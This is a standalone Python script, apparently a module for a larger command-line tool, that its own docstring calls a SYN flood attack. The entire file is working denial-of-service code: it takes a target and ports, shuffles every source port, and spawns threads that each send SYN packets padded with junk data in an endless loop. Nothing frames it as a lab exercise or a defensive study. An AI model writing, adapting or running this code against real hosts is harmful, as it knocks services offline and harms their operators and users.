#!/usr/bin/env python3

'''
this script performs syn flood attack
'''

from scapy.all import *
from scapy.layers.inet import *
from argparse import ArgumentParser
from random import randint
from time import sleep

class SynFlood:
    def __init__(self,target,ports):
        self.target = target
        self.ports = ports

    def start(self):
        self.check_ports()
        self.get_random_ports()
        try:
            self.run_attack()
        except KeyboardInterrupt :
            print()
            print('Attack Stopped!')
            exit() # exit when ctrl+c is pressed

    def check_ports(self):
        self.ports_in_attack = []
        if ',' in self.ports: # for specific ports
            self.ports_to_check = self.ports.split(',')
            num = 0
            for p in self.ports_to_check :
                try:
                    int(p)
                except:
                    print()
                    print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
                    exit()
                else:
                    if (num < 1):
                        print('ports : ',end='')
                        num += 1
                    self.ports_in_attack.append(int(p))
                    print(p + ' ',end='')

        elif '-' in self.ports : # for ports range
            try :
                port_start = int(self.ports.split('-')[0])
                port_end = int(self.ports.split('-')[1])
            except :
                print()
                print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
                exit()
            else:
                self.ports_in_attack = list(range(port_start,port_end + 1))

        else: # for single port
            try :
                int(self.ports)
            except ValueError:
                print()
                print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
                exit()
            else:
                self.ports_in_attack.append(int(self.ports))
        print()

    def get_random_ports(self):
        all_ports = list(range(1,65536))
        self.random_ports_list = []
        while (len(all_ports) != 0) :
            random_index_number = randint(0 ,len(all_ports) -1)
            port = all_ports.pop(random_index_number)
            self.random_ports_list.append(port)

    def run_attack(self):
        print('3.5 seconds to start attack ---> CTRL+C to stop ....')
        # sleep(3.5)
        for random_p in self.random_ports_list:
            for p_in_attack in self.ports_in_attack:
                t= Thread(target=self.send_packet,args=(random_p,p_in_attack,))
                t.daemon = True
                t.start()

    def send_packet(self,random_port,port_in_attack):
        ip = IP(dst=self.target)
        tcp = TCP(flags='S',sport=int(random_port),dport=int(port_in_attack))
        trash_data = Raw(b'd'*1024) # add some trash data to flood
        packet = ip / tcp / trash_data
        send(packet,verbose=1,loop=1)


def print_parser_help():
    help_text = '''
optional arguments:
  --script-help, -sh           Show Script Help
  --target, -t                 Target To Attack
  --port, -p   x,y,z or x-z    Port Numbers To Attack
    '''
    print(help_text)


parser = ArgumentParser(usage='sudo python3 %(prog)s --script syn_flood.py [--script-help or -sh for help] [--target TARGET] [--port PORT(S)]',allow_abbrev=False)
parser.add_argument('--script-help', '-sh', help='Show Script Help', action='store_true')
parser.add_argument('--target','-t', help='Target To Attack', metavar='')
parser.add_argument('--port','-p',help='Port Numbers To Attack', metavar='x,y,z')
args, unknown = parser.parse_known_args()

if ((args.script_help is not None) and (args.script_help is True)):
    print_parser_help()

if ((args.target != None) and (args.port != None)):
    pass
else:
    parser.print_usage()
    exit()

syn_flood = SynFlood(args.target,args.port)
syn_flood.start()